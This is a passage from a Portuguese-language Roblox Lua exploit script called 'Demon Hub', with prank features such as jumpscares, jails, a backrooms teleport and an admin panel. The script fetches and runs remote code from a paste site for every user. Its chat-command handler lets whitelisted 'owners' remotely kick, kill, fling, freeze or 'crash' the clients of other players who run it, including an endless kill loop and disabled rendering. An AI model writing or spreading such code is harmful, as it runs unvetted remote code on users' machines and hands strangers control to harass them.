        if ghostfaceGUI then
            ghostfaceGUI:Destroy()
        end
    end
    
    SendMessage("MODO GHOSTFACE DESATIVADO!", Color3.fromRGB(255, 100, 100))
    
    return true
end

-- Sistema de comandos Ghostface
local function SetupGhostfaceCommands()
    -- Observar mensagens no chat
    local function onChatMessage(message)
        local text = string.lower(message.Text)
        local player = Players:GetPlayerByUserId(message.TextSource.UserId)
        
        if player == LocalPlayer then
            if string.find(text, "!ghostface") then
                ActivateGhostfaceMode()
            elseif string.find(text, "!unghostface") then
                DeactivateGhostfaceMode()
            end
        end
    end
    
    -- Conectar ao chat
    if TextChatService then
        local channels = TextChatService:FindFirstChild("TextChannels")
        if channels then
            local rbxGeneral = channels:FindFirstChild("RBXGeneral")
            if rbxGeneral then
                ghostfaceConnections["chatListener"] = rbxGeneral.OnIncomingMessage:Connect(onChatMessage)
            end
        end
    end
    
    -- Também observar ConsoleChat
    local consoleChat = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
    if consoleChat then
        local onMessage = consoleChat:FindFirstChild("OnMessageDoneFiltering")
        if onMessage then
            ghostfaceConnections["oldChat"] = onMessage.OnClientEvent:Connect(function(data)
                if data.FromSpeaker == LocalPlayer.Name then
                    local text = string.lower(data.Message)
                    if string.find(text, "!ghostface") then
                        ActivateGhostfaceMode()
                    elseif string.find(text, "!unghostface") then
                        DeactivateGhostfaceMode()
                    end
                end
            end)
        end
    end
    
    -- Mensagem inicial
    task.wait(2)
    SendMessage("Comandos disponíveis: !ghostface (ativa tudo) | !unghostface (desativa tudo)", Color3.fromRGB(255, 200, 0))
end

-- Inicializar comandos Ghostface
SetupGhostfaceCommands()

-- ===== SISTEMA BACKROOMS =====
local backroomsMonster = nil
local monsterActive = false

local function CreateBackroomsMonster(position)
    local monsterFolder = Instance.new("Folder")
    monsterFolder.Name = "BackroomsMonster"
    
    local monsterPart = Instance.new("Part")
    monsterPart.Name = "MonsterBody"
    monsterPart.Size = Vector3.new(8, 12, 8)
    monsterPart.Position = position
    monsterPart.Anchored = true
    monsterPart.CanCollide = true
    monsterPart.Material = Enum.Material.SmoothPlastic
    monsterPart.BrickColor = BrickColor.new("Really black")
    monsterPart.Parent = monsterFolder
    
    local monsterDecal = Instance.new("Decal")
    monsterDecal.Name = "MonsterFace"
    monsterDecal.Texture = "rbxassetid://126754882337711"
    monsterDecal.Face = Enum.NormalId.Front
    monsterDecal.Parent = monsterPart
    
    monsterFolder.Parent = workspace
    return monsterFolder
end

local function ActivateMonster(player)
    if not player or not player.Character then return end
    
    local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return end
    
    if not backroomsMonster then
        local monsterPosition = humanoidRootPart.Position + Vector3.new(25, 0, 0)
        backroomsMonster = CreateBackroomsMonster(monsterPosition)
    end
    
    monsterActive = true
    
    -- Jumpscare
    local screenGui = Instance.new("ScreenGui", CoreGui)
    screenGui.Name = "MonsterJumpscare"
    screenGui.IgnoreGuiInset = true
    
    local imageLabel = Instance.new("ImageLabel", screenGui)
    imageLabel.Size = UDim2.new(1, 0, 1, 0)
    imageLabel.Position = UDim2.new(0, 0, 0, 0)
    imageLabel.BackgroundColor3 = Color3.new(0, 0, 0)
    imageLabel.Image = "rbxassetid://126754882337711"
    imageLabel.ImageTransparency = 1
    
    coroutine.wrap(function()
        imageLabel.ImageTransparency = 0
        wait(1)
        for i = 1, 10 do
            imageLabel.ImageTransparency = i / 10
            wait(0.05)
        end
        screenGui:Destroy()
    end)()
    
    StarterGui:SetCore("ChatMakeSystemMessage", {
        Text = "O MONSTRO DAS BACKROOMS TE VIU! FUJA!",
        Color = Color3.fromRGB(255, 0, 0),
        Font = Enum.Font.GothamBold
    })
    
    return true
end

local function CreateBackrooms()
    local backroomsFolder = workspace:FindFirstChild("LightClient_Backrooms")
    if backroomsFolder then
        backroomsFolder:Destroy()
    end
    
    backroomsFolder = Instance.new("Folder")
    backroomsFolder.Name = "LightClient_Backrooms"
    backroomsFolder.Parent = workspace
    
    local mapID = 10581711055
    local distantPosition = Vector3.new(0, 10000, 0)
    local teleportPosition = Vector3.new(59.06, 9996.70, 19.42)
    
    local success, mapa = pcall(function()
        return game:GetObjects("rbxassetid://"..mapID)[1]
    end)
    
    if success and mapa then
        mapa.Parent = backroomsFolder
        mapa.Name = "BackroomsMap"
        
        -- Move todas as partes para a posição distante
        for _, part in ipairs(mapa:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Position = part.Position + distantPosition
            end
        end
        
        -- Cria um spawn point no centro do mapa
        local centerPart = nil
        for _, part in ipairs(mapa:GetDescendants()) do
            if part:IsA("BasePart") and part.Name == "Part" then
                centerPart = part
                break
            end
        end
        
        local spawnPosition
        if centerPart then
            spawnPosition = centerPart.Position + Vector3.new(0, 5, 0)
        else
            spawnPosition = Vector3.new(0, 10005, 0)
        end
        
        Lighting.Brightness = 0.3
        Lighting.Ambient = Color3.fromRGB(255, 220, 150)
        Lighting.OutdoorAmbient = Color3.fromRGB(255, 220, 150)
        
        return backroomsFolder, spawnPosition
    else
        -- Se não conseguir carregar o mapa, cria um backrooms simples
        for x = 1, 10 do
            for z = 1, 10 do
                local wall = Instance.new("Part")
                wall.Size = Vector3.new(50, 30, 5)
                wall.Position = Vector3.new(x * 50, 10000, z * 50)
                wall.Anchored = true
                wall.CanCollide = true
                wall.BrickColor = BrickColor.new("Bright yellow")
                wall.Material = Enum.Material.SmoothPlastic
                wall.Parent = backroomsFolder
            end
        end
        
        -- Chão
        local floor = Instance.new("Part")
        floor.Size = Vector3.new(500, 5, 500)
        floor.Position = Vector3.new(250, 9985, 250)
        floor.Anchored = true
        floor.CanCollide = true
        floor.BrickColor = BrickColor.new("Bright yellow")
        floor.Material = Enum.Material.SmoothPlastic
        floor.Parent = backroomsFolder
        
        -- Teto
        local ceiling = Instance.new("Part")
        ceiling.Size = Vector3.new(500, 5, 500)
        ceiling.Position = Vector3.new(250, 10025, 250)
        ceiling.Anchored = true
        ceiling.CanCollide = true
        ceiling.BrickColor = BrickColor.new("Bright yellow")
        ceiling.Material = Enum.Material.SmoothPlastic
        ceiling.Parent = backroomsFolder
        
        Lighting.Brightness = 0.3
        Lighting.Ambient = Color3.fromRGB(255, 220, 150)
        Lighting.OutdoorAmbient = Color3.fromRGB(255, 220, 150)
        
        return backroomsFolder, Vector3.new(250, 10005, 250)
    end
end

local function TeleportToBackrooms(player)
    if not player or not player.Character then
        return false
    end
    
    local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then
        return false
    end
    
    local backroomsFolder, spawnPosition = CreateBackrooms()
    humanoidRootPart.CFrame = CFrame.new(spawnPosition)
    
    task.wait(3)
    ActivateMonster(player)
    
    return true
end

local function RestoreNormalWorld()
    monsterActive = false
    if backroomsMonster then
        backroomsMonster:Destroy()
        backroomsMonster = nil
    end
    
    local backroomsFolder = workspace:FindFirstChild("LightClient_Backrooms")
    if backroomsFolder then
        backroomsFolder:Destroy()
    end
    
    Lighting.Brightness = 2
    Lighting.Ambient = Color3.fromRGB(128, 128, 128)
    Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
end

-- ===== SISTEMA CUBO DE CASTIGO =====
local punishmentCube = nil

local function CreatePunishmentCube()
    -- Remover cubo antigo se existir
    if punishmentCube then
        punishmentCube:Destroy()
        punishmentCube = nil
    end
    
    -- Criar um modelo para o cubo
    local cubeModel = Instance.new("Model")
    cubeModel.Name = "PunishmentCube"
    
    -- Posição alta no céu
    local cubePosition = Vector3.new(0, 15000, 0)
    
    -- Criar as 6 paredes do cubo (exterior)
    local cubeSize = 50
    local wallThickness = 5
    
    -- Textura para todas as paredes (MESMA TEXTURA DO CUBO)
    local textureId = "rbxassetid://98963458215787"
    
    -- Paredes do cubo
    local walls = {
        {position = Vector3.new(cubeSize/2, 0, 0), size = Vector3.new(wallThickness, cubeSize, cubeSize)}, -- Direita
        {position = Vector3.new(-cubeSize/2, 0, 0), size = Vector3.new(wallThickness, cubeSize, cubeSize)}, -- Esquerda
        {position = Vector3.new(0, cubeSize/2, 0), size = Vector3.new(cubeSize, wallThickness, cubeSize)}, -- Topo
        {position = Vector3.new(0, -cubeSize/2, 0), size = Vector3.new(cubeSize, wallThickness, cubeSize)}, -- Fundo
        {position = Vector3.new(0, 0, cubeSize/2), size = Vector3.new(cubeSize, cubeSize, wallThickness)}, -- Frente
        {position = Vector3.new(0, 0, -cubeSize/2), size = Vector3.new(cubeSize, cubeSize, wallThickness)} -- Trás
    }
    
    for _, wallData in ipairs(walls) do
        local wall = Instance.new("Part")
        wall.Size = wallData.size
        wall.Position = cubePosition + wallData.position
        wall.Anchored = true
        wall.CanCollide = true
        wall.Material = Enum.Material.SmoothPlastic
        wall.Transparency = 0.3
        wall.Color = Color3.fromRGB(0, 0, 0)
        wall.Name = "CubeWall"
        wall.Parent = cubeModel
        
        -- Aplicar textura em todas as faces
        for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
            local decal = Instance.new("Decal")
            decal.Texture = textureId
            decal.Face = face
            decal.Parent = wall
        end
    end
    
    -- Criar interior vazio (para o jogador ficar dentro)
    local interior = Instance.new("Part")
    interior.Name = "CubeInterior"
    interior.Size = Vector3.new(cubeSize - wallThickness*2, cubeSize - wallThickness*2, cubeSize - wallThickness*2)
    interior.Position = cubePosition
    interior.Anchored = true
    interior.CanCollide = false
    interior.Transparency = 1
    interior.Parent = cubeModel
    
    -- Posição dentro do cubo (centro)
    local insidePosition = cubePosition + Vector3.new(0, 0, 0)
    
    cubeModel.PrimaryPart = interior
    cubeModel.Parent = workspace
    punishmentCube = cubeModel
    
    return cubeModel, insidePosition
end

local function TeleportToCube(player)
    if not player or not player.Character then
        return false
    end
    
    local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then
        return false
    end
    
    local cube, insidePosition = CreatePunishmentCube()
    
    -- Teleporta o jogador para DENTRO do cubo
    humanoidRootPart.CFrame = CFrame.new(insidePosition)
    
    -- Congelar jogador dentro do cubo
    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.WalkSpeed = 0
        humanoid.JumpPower = 0
    end
    
    -- Impedir que o jogador saia do cubo
    local connection
    connection = RunService.Heartbeat:Connect(function()
        if not player.Character or not humanoidRootPart or not humanoidRootPart.Parent then
            connection:Disconnect()
            return
        end
        
        -- Mantém o jogador dentro do cubo
        local distanceFromCenter = (humanoidRootPart.Position - insidePosition).Magnitude
        if distanceFromCenter > 20 then
            humanoidRootPart.CFrame = CFrame.new(insidePosition)
        end
    end)
    
    -- Enviar mensagem
    StarterGui:SetCore("ChatMakeSystemMessage", {
        Text = "VOCÊ FOI ENVIADO PARA O CUBO DE CASTIGO!",
        Color = Color3.fromRGB(255, 0, 0),
        Font = Enum.Font.GothamBold
    })
    
    return true
end

local function RemoveFromCube(player)
    if not player or not player.Character then
        return false
    end
    
    -- Restaurar movimentação
    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.WalkSpeed = 16
        humanoid.JumpPower = 50
    end
    
    -- Teleportar de volta para o spawn
    local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
    if humanoidRootPart then
        humanoidRootPart.CFrame = CFrame.new(0, 5, 0)
    end
    
    -- Remover cubo
    if punishmentCube then
        punishmentCube:Destroy()
        punishmentCube = nil
    end
    
    -- Enviar mensagem
    StarterGui:SetCore("ChatMakeSystemMessage", {
        Text = "VOCÊ FOI LIBERADO DO CUBO DE CASTIGO!",
        Color = Color3.fromRGB(0, 255, 0),
        Font = Enum.Font.GothamBold
    })
    
    return true
end

-- ===== SISTEMA JAIL/UNJAIL COM MESMA TEXTURA DO CUBO =====
local jaulas = {}
local jailConnections = {}

local function CriarJailComTextura(position, playerName)
    -- Remover jaula antiga se existir
    if jaulas[playerName] then
        for _, part in ipairs(jaulas[playerName]) do
            part:Destroy()
        end
        jaulas[playerName] = nil
    end
    
    -- Criar uma caixa de prisão com a mesma textura do cubo
    local jailBox = {}
    local size = 10
    local height = 10
    
    -- Textura igual ao cubo
    local textureId = "rbxassetid://98963458215787"
    
    -- Criar o chão
    local floor = Instance.new("Part")
    floor.Size = Vector3.new(size, 1, size)
    floor.Position = position
    floor.Anchored = true
    floor.CanCollide = true
    floor.Transparency = 0.3
    floor.Color = Color3.fromRGB(0, 0, 0)
    floor.Material = Enum.Material.SmoothPlastic
    floor.Name = "JailFloor"
    floor.Parent = workspace
    table.insert(jailBox, floor)
    
    -- Aplicar textura no chão
    local floorDecal = Instance.new("Decal")
    floorDecal.Texture = textureId
    floorDecal.Face = Enum.NormalId.Top
    floorDecal.Parent = floor
    
    -- Criar as 4 paredes
    local walls = {
        {position = Vector3.new(size/2, height/2, 0), size = Vector3.new(1, height, size), face = Enum.NormalId.Left}, -- Direita
        {position = Vector3.new(-size/2, height/2, 0), size = Vector3.new(1, height, size), face = Enum.NormalId.Right}, -- Esquerda
        {position = Vector3.new(0, height/2, size/2), size = Vector3.new(size, height, 1), face = Enum.NormalId.Back}, -- Frente
        {position = Vector3.new(0, height/2, -size/2), size = Vector3.new(size, height, 1), face = Enum.NormalId.Front}  -- Trás
    }
    
    for _, wallData in ipairs(walls) do
        local wall = Instance.new("Part")
        wall.Size = wallData.size
        wall.Position = position + wallData.position
        wall.Anchored = true
        wall.CanCollide = true
        wall.Transparency = 0.3
        wall.Color = Color3.fromRGB(0, 0, 0)
        wall.Material = Enum.Material.SmoothPlastic
        wall.Name = "JailWall"
        wall.Parent = workspace
        table.insert(jailBox, wall)
        
        -- Aplicar textura na parede
        local wallDecal = Instance.new("Decal")
        wallDecal.Texture = textureId
        wallDecal.Face = wallData.face
        wallDecal.Parent = wall
    end
    
    -- Criar teto
    local ceiling = Instance.new("Part")
    ceiling.Size = Vector3.new(size, 1, size)
    ceiling.Position = position + Vector3.new(0, height, 0)
    ceiling.Anchored = true
    ceiling.CanCollide = true
    ceiling.Transparency = 0.3
    ceiling.Color = Color3.fromRGB(0, 0, 0)
    ceiling.Material = Enum.Material.SmoothPlastic
    ceiling.Name = "JailCeiling"
    ceiling.Parent = workspace
    table.insert(jailBox, ceiling)
    
    -- Aplicar textura no teto
    local ceilingDecal = Instance.new("Decal")
    ceilingDecal.Texture = textureId
    ceilingDecal.Face = Enum.NormalId.Bottom
    ceilingDecal.Parent = ceiling
    
    -- Salvar referência
    jaulas[playerName] = jailBox
    
    return jailBox
end

local function RemoverJail(playerName)
    if jaulas[playerName] then
        for _, part in ipairs(jaulas[playerName]) do
            part:Destroy()
        end
        jaulas[playerName] = nil
    end
    
    -- Remover conexão de monitoramento
    if jailConnections[playerName] then
        jailConnections[playerName]:Disconnect()
        jailConnections[playerName] = nil
    end
end

-- ===== SISTEMA FLOAT =====
local function FloatPlayer(player)
    if not player or not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") or not player.Character:FindFirstChildOfClass("Humanoid") then 
        return false 
    end
    
    local targetHrp = player.Character.HumanoidRootPart
    local targetHumanoid = player.Character:FindFirstChildOfClass("Humanoid")
    local targetPos = targetHrp.Position

    targetHumanoid.WalkSpeed = 0
    targetHumanoid.JumpHeight = 0

    local bodyVelocity = Instance.new("BodyVelocity", targetHrp)
    bodyVelocity.MaxForce = Vector3.new(0, math.huge, 0)
    bodyVelocity.Velocity = Vector3.new(0, 10, 0)
    bodyVelocity.Name = "FloatVelocity"

    local maxHeight = targetPos.Y + 50
    local connection
    connection = RunService.Heartbeat:Connect(function()
        if not player.Character or not player.Character.Parent or not targetHrp.Parent or not targetHumanoid.Parent then
            bodyVelocity:Destroy()
            connection:Disconnect()
            return
        end
        if targetHrp.Position.Y >= maxHeight then
            bodyVelocity:Destroy()
            connection:Disconnect()
            targetHumanoid.Health = 0
        end
    end)
    
    return true
end

-- ===== SISTEMA EXPLODIR =====
local function ExplodirPlayer(player)
    if not player or not player.Character then
        return false
    end
    
    local character = player.Character
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    
    if not humanoidRootPart then
        return false
    end
    
    -- Cria uma explosão visual
    local explosion = Instance.new("Explosion")
    explosion.Position = humanoidRootPart.Position
    explosion.BlastPressure = 1000000
    explosion.BlastRadius = 20
    explosion.DestroyJointRadiusPercent = 1
    explosion.Parent = workspace
    
    -- Mata o personagem
    if character then
        character:BreakJoints()
        
        -- Efeito adicional de partículas
        for i = 1, 15 do
            local part = Instance.new("Part")
            part.Size = Vector3.new(5, 5, 5)
            part.Position = humanoidRootPart.Position + Vector3.new(math.random(-10, 10), math.random(0, 10), math.random(-10, 10))
            part.Anchored = false
            part.CanCollide = false
            part.Material = Enum.Material.Neon
            part.BrickColor = BrickColor.new("Bright orange")
            part.Parent = workspace
            
            local bodyVelocity = Instance.new("BodyVelocity")
            bodyVelocity.Velocity = Vector3.new(
                math.random(-50, 50),
                math.random(20, 80),
                math.random(-50, 50)
            )
            bodyVelocity.MaxForce = Vector3.new(100000, 100000, 100000)
            bodyVelocity.Parent = part
            
            game.Debris:AddItem(part, 3)
        end
    end
    
    return true
end

-- ===== SISTEMA DE JUMPSCARES =====
local JUMPSCARES = {
    { Name = "!jumps1", ImageId = "rbxassetid://126754882337711", AudioId = "rbxassetid://138873214826309" },
    { Name = "!jumps2", ImageId = "rbxassetid://86379969987314", AudioId = "rbxassetid://143942090" },
    { Name = "!jumps3", ImageId = "rbxassetid://127382022168206", AudioId = "rbxassetid://143942090" },
    { Name = "!jumps4", ImageId = "rbxassetid://95973611964555", AudioId = "rbxassetid://138873214826309" },
}

local function ExecutarJumpscare(jumpscareIndex)
    local jumpscare = JUMPSCARES[jumpscareIndex]
    if not jumpscare then return end
    
    -- Criar tela de jumpscare
    local screenGui = Instance.new("ScreenGui", CoreGui)
    screenGui.Name = "JumpscareGUI"
    screenGui.IgnoreGuiInset = true
    
    local imageLabel = Instance.new("ImageLabel", screenGui)
    imageLabel.Size = UDim2.new(1, 0, 1, 0)
    imageLabel.Position = UDim2.new(0, 0, 0, 0)
    imageLabel.BackgroundColor3 = Color3.new(0, 0, 0)
    imageLabel.Image = jumpscare.ImageId
    imageLabel.ImageTransparency = 1
    
    -- Tocar som do jumpscare
    local sound = Instance.new("Sound")
    sound.SoundId = jumpscare.AudioId
    sound.Volume = 1
    sound.Parent = workspace
    sound:Play()
    game.Debris:AddItem(sound, 5)
    
    -- Animação do jumpscare
    coroutine.wrap(function()
        -- Aparece
        for i = 0, 10 do
            imageLabel.ImageTransparency = (10 - i) / 10
            task.wait(0.02)
        end
        
        -- Permanece por 0.5 segundos
        task.wait(0.5)
        
        -- Some
        for i = 0, 10 do
            imageLabel.ImageTransparency = i / 10
            task.wait(0.03)
        end
        
        screenGui:Destroy()
    end)()
end

-- ===== SISTEMA COOLKID AVATAR =====
local function ApplyCoolkidAvatar()
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    
    -- Espera pelo character
    local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local Humanoid = Character:FindFirstChildOfClass("Humanoid")
    if not Humanoid then return end

    -- Tenta obter a descrição atual
    local success, desc = pcall(function()
        return Humanoid:GetAppliedDescription()
    end)
    
    -- Remove accessories existentes se possível
    if success and desc and desc.GetAccessories then
        local WearRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Wear")
        for _, accessory in ipairs(desc:GetAccessories(true)) do
            if accessory.AssetId then
                local args = {
                    [1] = tonumber(accessory.AssetId)
                }
                pcall(function()
                    WearRemote:InvokeServer(unpack(args))
                end)
            end
        end
    end

    task.wait(0.5)

    -- Tenta mudar as proporções do corpo
    local changeBodyRemote = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("ChangeCharacterBody")
    if changeBodyRemote then
        local args = {
            {
                0,
                0,
                0,
                0,
                0,
                0
            }
        }
        pcall(function()
            changeBodyRemote:InvokeServer(unpack(args))
        end)
    end

    -- Adiciona acessórios
    local wearRemote = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("Wear")
    if wearRemote then
        pcall(function()
            wearRemote:InvokeServer(18554114295) -- Acessório 1
            task.wait(0.1)
            wearRemote:InvokeServer(3164473649)  -- Acessório 2
            task.wait(0.1)
            wearRemote:InvokeServer(6093233760)  -- Acessório 3
        end)
    end

    -- Tenta mudar a cor do corpo
    local changeColorRemote = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("ChangeBodyColor")
    if changeColorRemote then
        pcall(function()
            changeColorRemote:FireServer("Really red")
        end)
    end
    
    -- Mensagem de sucesso
    StarterGui:SetCore("ChatMakeSystemMessage", {
        Text = "[Demon Hub] Coolkid Avatar aplicado!",
        Color = Color3.fromRGB(255, 0, 0),
        Font = Enum.Font.GothamBold
    })
    
    print("CoolkidAvatar aplicado com sucesso!")
end

-- Executa Fire Carregamento para todos
local success, fireError = pcall(function()
    loadstring(game:HttpGet("https://ghostbin.axel.org/paste/un6ag/raw"))()
end)

if not success then
    warn("Erro ao carregar Fire:", fireError)
end

-- Se for dono, ativa o painel admin (VERIFICAÇÃO CORRIGIDA)
local isOwner = Donos[LocalPlayer.Name:lower()]
print("[Demon Hub] Verificando se é dono...")
print("[Demon Hub] Nome do jogador:", LocalPlayer.Name)
print("[Demon Hub] Nome em minúsculas:", LocalPlayer.Name:lower())
print("[Demon Hub] É dono?", isOwner)

if isOwner then
    print("[Demon Hub] Usuário é dono, criando interface...")
    
    -- Tenta criar a interface com proteção contra erros
    local success, errorMsg = pcall(function()
        local playerOriginalSpeed = {}

        local function EnviarComando(comando, playerName)
            local msg = comando
            if playerName then msg = comando.." "..playerName end
            local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
            if canal then
                canal:SendAsync(msg)
            else
                warn("Nenhum canal encontrado")
            end
        end

        -- Carrega a WindUI
        local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
        
        -- Cria a janela
        local Window = WindUI:CreateWindow({
            Title = "Demon Hub | Admin Panel",
            Icon = "shield",
            Author = "by Hiro",
            Folder = "Demon Hub",
            Size = UDim2.fromOffset(650, 600),
            Transparent = true,
            Theme = "Midnight",
            Resizable = false,
            SideBarWidth = 200,
            BackgroundImageTransparency = 0.42,
            HideSearchBar = true,
            ScrollBarEnabled = true,
        })

        print("[Demon Hub] Janela criada com sucesso!")

        -- Aba Comandos
        local TabComandos = Window:Tab({ Title = "Comandos", Icon = "terminal", Locked = false })
        local SectionComandos = TabComandos:Section({ Title = "Admin", Icon = "user-cog", Opened = true })

        local TargetName
        local function getPlayersList()
            local t = {}
            for _, p in ipairs(Players:GetPlayers()) do
                table.insert(t, p.Name)
            end
            return t
        end

        local Dropdown = SectionComandos:Dropdown({
            Title = "Selecionar Jogador",
            Values = getPlayersList(),
            Value = "",
            Callback = function(option)
                TargetName = option
            end
        })

        Players.PlayerAdded:Connect(function()
            Dropdown:SetValues(getPlayersList())
        end)
        Players.PlayerRemoving:Connect(function()
            Dropdown:SetValues(getPlayersList())
        end)

        -- Lista de comandos básicos (PREFIXO !)
        local comandosAlvo = {"kick","kill","killplus","fling","freeze","unfreeze","bring","jail","unjail","cubo","uncubo","backrooms","unbackrooms"}

        for _, cmd in ipairs(comandosAlvo) do
            SectionComandos:Button({
                Title = cmd:upper(),
                Desc = "Envia !"..cmd.." no chat para o jogador selecionado",
                Callback = function()
                    if TargetName then
                        EnviarComando("!"..cmd, TargetName)
                    else
                        WindUI:Notify("Erro", "Selecione jogadores primeiro!")
                    end
                end
            })
        end

        -- Adicionar botão Crash específico
        SectionComandos:Button({
            Title = "CRASH",
            Icon = "alert-triangle",
            Desc = "Trava e kicka o jogador selecionado",
            Callback = function()
                if TargetName then
                    EnviarComando("!crash", TargetName)
                    WindUI:Notify("Crash", "Comando executado!")
                else
                    WindUI:Notify("Erro", "Selecione um jogador primeiro!")
                end
            end
        })

        -- Adicionar botão Float específico
        SectionComandos:Button({
            Title = "FLOAT",
            Icon = "arrow-up",
            Desc = "Faz o jogador flutuar até morrer",
            Callback = function()
                if TargetName then
                    EnviarComando("!float", TargetName)
                    WindUI:Notify("Float", "Comando executado!")
                else
                    WindUI:Notify("Erro", "Selecione um jogador primeiro!")
                end
            end
        })

        -- Adicionar botão Explodir específico
        SectionComandos:Button({
            Title = "EXPLODIR",
            Icon = "bomb",
            Desc = "Explode o jogador",
            Callback = function()
                if TargetName then
                    EnviarComando("!explodir", TargetName)
                    WindUI:Notify("EXPLOSÃO", "Comando executado!")
                else
                    WindUI:Notify("Erro", "Selecione jogadores primeiro!")
                end
            end
        })

        -- ===== BOTÃO GHOSTFACE ADICIONADO AQUI =====
        SectionComandos:Button({
            Title = "GHOSTFACE",
            Icon = "ghost",
            Desc = "Ativa modo Ghostface completo (avatar + foice)",
            Callback = function()
                if TargetName then
                    EnviarComando("!ghostface", TargetName)
                    WindUI:Notify("Ghostface", "Comando enviado!")
                else
                    WindUI:Notify("Erro", "Selecione um jogador primeiro!")
                end
            end
        })

        -- Aba Misc (Jumpscares e Coolkid Avatar)
        local TabMisc = Window:Tab({ Title = "Misc", Icon = "ghost", Locked = false })
        
        -- Seção Jumpscares
        local SectionJumpscares = TabMisc:Section({ Title = "Jumpscares", Icon = "alert-triangle", Opened = true })
        
        -- Adicionar botões de jumpscare
        for i, jumpscare in ipairs(JUMPSCARES) do
            SectionJumpscares:Button({
                Title = "Jumpscare " .. i,
                Icon = "alert-triangle",
                Callback = function()
                    if TargetName then
                        EnviarComando("!jumps" .. i, TargetName)
                        WindUI:Notify("Jumpscare", "Jumpscare " .. i .. " enviado!")
                    else
                        WindUI:Notify("Erro", "Selecione um jogador primeiro!")
                    end
                end
            })
        end

        -- Seção Avatar (APENAS COOLKID AVATAR)
        local SectionAvatar = TabMisc:Section({ Title = "Avatar", Icon = "shirt", Opened = true })
        
        -- Botão Coolkid Avatar
        SectionAvatar:Button({
            Title = "COOLKID AVATAR",
            Icon = "shirt",
            Callback = function()
                if TargetName then
                    EnviarComando("!coolkidavatar", TargetName)
                    
                    -- Executar localmente se for o próprio jogador
                    if TargetName == LocalPlayer.Name then
                        ApplyCoolkidAvatar()
                        WindUI:Notify("Coolkid Avatar", "Aplicado em você!")
                    end
                    
                    WindUI:Notify("Coolkid Avatar", "Comando enviado para " .. TargetName .. "!")
                else
                    WindUI:Notify("Erro", "Selecione um jogador primeiro!")
                end
            end
        })

        -- Aba Verify
        local TabVerify = Window:Tab({ Title = "Verify", Icon = "check", Locked = false })
        local SectionVerify = TabVerify:Section({ Title = "Verificar", Icon = "search", Opened = true })
        SectionVerify:Button({
            Title = "Enviar Verificação",
            Desc = "Envia !verifique no chat",
            Callback = function()
                EnviarComando("!verifique")
            end
        })

        print("[Demon Hub] Interface criada com sucesso!")

        -- Função que executa comandos do chat (COM PREFIXO !)
        local function ExecutarComando(msgText, autor)
            -- Verifica se o autor está na whitelist e não expirado
            local userType, statusMessage = getUserWhitelistType(autor:lower())
            if not userType then 
                print("[Demon Hub] Usuário não autorizado ou whitelist expirada:", autor, statusMessage)
                return 
            end
            
            local playerName = LocalPlayer.Name:lower()
            local character = LocalPlayer.Character
            local humanoid = character and character:FindFirstChildOfClass("Humanoid")

            print("[Demon Hub] Processando comando:", msgText, "de:", autor, "Status:", statusMessage)

            -- Kick (PREFIXO !)
            if msgText:match("!kick%s+" .. playerName) then
                LocalPlayer:Kick("Kickado By Demon Hub.")
            end

            -- Kill (PREFIXO !)
            if msgText:match("!kill%s+" .. playerName) then
                if character then character:BreakJoints() end
            end

            -- KillPlus (PREFIXO !)
            if msgText:match("!killplus%s+" .. playerName) then
                if character then
                    character:BreakJoints()
                    local root = character:FindFirstChild("HumanoidRootPart")
                    if root then
                        for i = 1, 10 do
                            local part = Instance.new("Part")
                            part.Size = Vector3.new(10,10,10)
                            part.Anchored = false
                            part.CanCollide = false
                            part.Material = Enum.Material.Neon
                            part.BrickColor = BrickColor.Random()
                            part.CFrame = root.CFrame
                            part.Parent = workspace
                            local bv = Instance.new("BodyVelocity")
                            bv.Velocity = Vector3.new(math.random(-50,50), math.random(20,80), math.random(-50,50))
                            bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
                            bv.Parent = part
                            game.Debris:AddItem(part, 3)
                        end
                    end
                end
            end

            -- Fling (PREFIXO !)
            if msgText:match("!fling%s+" .. playerName) then
                if character then
                    local root = character:FindFirstChild("HumanoidRootPart")
                    if root then
                        local targetCFrame = CFrame.new(50000, 5000000, 3972823)
                        local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Linear)
                        local tween = TweenService:Create(root, tweenInfo, {CFrame = targetCFrame})
                        tween:Play()
                    end
                end
            end

            -- Crash (PREFIXO !)
            if msgText:match("!crash%s+" .. playerName) then
                -- Congela o personagem
                if humanoid then
                    humanoid.WalkSpeed = 0
                    humanoid.JumpPower = 0
                end
                
                -- Congela a tela
                RunService:Set3dRenderingEnabled(false)
                
                -- Mata o personagem repetidamente
                task.spawn(function()
                    while true do
                        if character then
                            character:BreakJoints()
                        end
                        task.wait(0.01)
                    end
                end)
                
                -- Kicka após 3 segundos
                task.wait(3)
                LocalPlayer:Kick("CRASHED By Demon Hub")
            end

            -- Freeze (PREFIXO !)
            if msgText:match("!freeze%s+" .. playerName) then
                if humanoid then
                    playerOriginalSpeed[playerName] = humanoid.WalkSpeed
                    humanoid.WalkSpeed = 0
                end
            end

            -- Unfreeze (PREFIXO !)
            if msgText:match("!unfreeze%s+" .. playerName) then
                if humanoid then
                    humanoid.WalkSpeed = playerOriginalSpeed[playerName] or 16
                    playerOriginalSpeed[playerName] = nil
                end
            end

